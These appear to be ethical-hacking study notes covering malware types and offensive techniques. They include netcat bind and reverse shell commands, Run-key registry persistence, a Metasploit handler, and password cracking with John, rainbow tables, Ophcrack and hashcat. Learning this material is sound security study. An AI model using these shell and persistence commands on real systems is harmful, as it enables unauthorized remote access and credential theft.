#### Malware
* Malicious Software that allows user to harm other system/user.
* Impact: Can cause DOS, Spy Users, Gain Unauthorized Access.

|Types|
|---|
|Virus|
|Trojan|
|Rootkit| 
|Bootkit|
|Adware|
|Spyware|
|Greyware|
|Dialer|
|Keylogger|
|Botnet|
|Ransomware|
|Worm|
|Data Stealing Malware|

#### Virus 
> Small piece of code that affects system, may execute every time when opeing the code, may replicate itself.

#### Trojan Horse
> Malware that can be embedded in harmless files like pdfs, Microsoft Office Files,etc. eg. Backdoor that can allow malicious user to gain shell on remote machine.Firewall can be used by network adminstrator to restrict connections from internet to internal machines.

#### Rootkit
> Malware that allows attacker to subert OS functioning.Attacker can maintain privileged access to victim machine bypassing firewalls.

#### Adware 
> Malcious software program that shows annoying ads to victim.

#### Spyware
> SOftware that allows attacker to monitor victims activities.Collects information like visited websites, collects password, etc.

#### Grayware
> Mutated malware

#### Keylogger
> Tracks users keystrokes, password and sends to attacker.Can be used in penetration tests.

|Keyloggers|Hardware Keylogger(Pendrive)|Rootkit Keylogger(more shealthy,invisible, works at kernel level hijacking OS APIs)|
|---|---|---|

![Screenshot at 2022-12-25 10-49-08](https://user-images.githubusercontent.com/85208639/209457618-4d5c4dd3-b815-4fbd-bc4f-fe2852fb2709.png)

#### Botnets
> Small Software programs installed on mass computers. Consist of C&C Server aand can be instructed to perform certain task simultaneously.

#### Ransomware
> Software that encrypts victims files with secret key.

#### Data Stealing Software
> Malicious software program capable of stealing most sensitive data.

#### Backdoor With Netcat

```
ncat.exe -l -p 5555 -e cmd.exe >> In victims Machine

nc 192.168.10.102 5555

```

#### Reverse Connection With Netcat

> Victim is on internal network and attacker wants to connect to it.

```
nc -lvp 5555  >> Attacker listens on port 5555
nc.exe -e cmd.exe 192.168.0.1 5555


```

#### Creating Persistent Backdoor With Netcat

* Attacker needs to edit the victims registry so even when victim closes his system upon reboot attacker will be able to get a shell.
```
nc -l -v -p 5555 >> In attackers machine
Open "regedit" in victims machine and navigate to "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"  and add new registry.
```
![Screenshot at 2022-12-25 13-04-04](https://user-images.githubusercontent.com/85208639/209460152-2b8f0ad9-177d-4f3e-8ff7-a91606ae3f93.png)


![Screenshot at 2022-12-25 13-05-33](https://user-images.githubusercontent.com/85208639/209460287-434fc945-ac92-4dc4-8a47-4bc57df29c0e.png)

#### Session Management With Metasploit 
> Since we have already obtained shell previously we can use metasploit to get more features.

#### Convert Reverse Shell to Meterpreter Shell
```
use multi/hander
set LHOST, LPORT on which you will listen and run
```

#### Password Attacks

##### Password Cracking
>Process of recoveing plaintext password from hash. Here attacker tries to guess password, hashes it and then compares the result against the password file.

##### Techniques
* Bruteforce Attack (Takes heck long time but yeilds better result)
* Dictionary Attack (Faster)

##### John the Ripper
###### M4ng1ing Rules with john the ripper
```
john -wordlist=file -rules <file to crack>
```

#### Rainbow Tables:

Password Cracking with rtgen
#### Rainbow Table Creation
```
sudo rtgen md5 loweralpha 1 3 0 1000 1000 0

echo "bug" | md5sum
> ae0e4bdad7b5f67141743366026d2ea5

rcrack md5_loweralpha#1-3_0_1000x1000_0.rt -h ae0e4bdad7b5f67141743366026d2ea5 >> hash will be cracked.

```
> If salt is used during hashing then rainbow table will be useless.

#### Ophcrack
> Ophcrack is a Windows password cracking tool used to crack NT and NTLM hashes.

* First download rainbow tables and download transmission.
* Load hashes and Click on Crack.

> Resource: https://ophcrack.sourceforge.io/ https://ophcrack.sourceforge.io/tables.php

#### Custom Rules in Hashcat (Useful During CTFs)

##### Resource: https://hashcat.net/wiki/doku.php?id=rule_based_attack
```
hashcat -m mode example.hash exaple.dict -r custom.rule
```


